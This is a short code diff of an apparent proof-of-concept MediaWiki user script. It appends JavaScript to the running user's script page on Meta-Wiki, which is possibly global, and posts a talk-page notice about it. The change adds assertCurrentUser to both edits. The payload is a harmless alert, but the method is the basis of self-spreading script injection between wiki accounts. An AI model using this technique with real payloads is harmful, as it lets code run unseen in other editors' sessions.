@@ -25,14 +25,14 @@
 		const metaApi = new mw.ForeignApi("https://meta.wikimedia.org/w/api.php");
 		const username = mw.config.get('wgUserName');
 
-		await metaApi.postWithToken("csrf", {
+		await metaApi.postWithToken("csrf", metaApi.assertCurrentUser({
 			action: 'edit',
 			title: `User:${username}/wiki-poc--could-be--global.js`,
 			appendtext: "\nalert('Hi');",
 			summary: 'POC edit'
-		});
+		}));
 
-		await metaApi.postWithToken("csrf", {
+		await metaApi.postWithToken("csrf", metaApi.assertCurrentUser({
 			action: "edit",
 			title: "User talk:Nux",
 			section: "new",
@@ -40,7 +40,7 @@
 			text: `I just wanted you to check out [[User:${username}/wiki-poc--could-be--global.js]] ~~~~`,
 			summary: "PoC message",
 			format: "json"
-		});
+		}));
 	}
 	async function doTheStuff() {
 		let activeUsers = [];
